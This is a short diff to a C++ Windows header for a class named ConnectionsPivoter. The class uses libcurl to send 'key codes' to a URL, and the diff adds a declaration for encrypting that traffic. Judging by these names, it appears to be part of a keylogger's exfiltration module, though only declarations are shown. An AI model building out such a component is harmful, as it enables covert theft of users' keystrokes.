@@ -7,6 +7,7 @@
 #include <string>
 #include <vector>
 #include <Windows.h>
+#include <bcrypt.h>
 #include <curl/curl.h>
 
 #pragma comment (lib, "Normaliz.lib")
@@ -19,7 +20,7 @@ class ConnectionsPivoter {
 public:
 	std::string url; 
 	CURL* curl; 
-
+	
 	ConnectionsPivoter(std::string url); 
 	ConnectionsPivoter();
 
@@ -37,6 +38,13 @@ public:
 	/// <param name='codes:'>vector of key codes</param>
 	/// <returns>TRUE if successful</returns>
 	BOOL send_codes(std::vector<std::string> codes); 
+
+	/// <summary>
+	/// Encrypt the given data
+	/// </summary>
+	/// <param name='data:'>Data to encrypt</param>
+	/// <returns>Encrypted data</returns>
+	PBYTE encrypt_traffic(std::string data, size_t *output_length); 
 private:
 
 };
